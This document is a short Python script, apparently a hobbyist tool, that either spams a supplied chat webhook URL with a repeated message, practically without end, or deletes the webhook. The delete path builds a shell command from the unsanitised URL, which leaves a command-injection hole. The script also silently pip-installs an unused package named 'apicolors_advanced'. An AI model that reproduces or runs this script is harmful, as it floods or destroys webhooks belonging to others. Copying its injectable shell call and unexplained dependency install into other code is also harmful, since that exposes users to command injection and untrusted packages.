import os
import time

try:
  import requests
  import apicolors_advanced
except:
  os.system("pip install requests")
  os.system("pip install apicolors_advanced")

option = input("1.) Deleter, 2.) Spammer. Which option?: ")

if option == "2":
    webhook = input("Enter the webhook url: ")
    message = input("What message?: ")
    times = input("How many times? (inf for infinite): ")
    if times == "inf" or times == "infinite":
        for i in range(100**1000):
            req = requests.post(webhook, data={"content" : message})
            if req.status_code == int(200) or req.status_code == int(204):
                print(f"Sent {i} message(s).")
                
            elif req.status_code == int(429):
                print("Ratelimited!")
                time.sleep(1.5)

            else:
                print("INVALID WEBHOOK")
    else:
        for i in range(int(times)):
            req = requests.post(webhook, data={"content" : message})
            if req.status_code == int(200) or req.status_code == int(204):
                print(f"Sent {i} message(s).")
                
            elif req.status_code == int(429):
                print("Ratelimited!")
                time.sleep(1.5)

            else:
                print("INVALID WEBHOOK")

else:
    webhook = input("Enter the webhook url: ")
    os.system(f"cURL -X DELETE {webhook}")
    
    req = requests.post(webhook, data={"content" : "This is a test to see if the webhook deletion process worked."})
    if req.status_code == int(204) or req.status_code == int(200):
        print("Failed to delete webhook.")
    if req.status_code == int(404):
        print("Sucessfully deleted webhook")
    else:
        print("INVALID WEBHOOK")
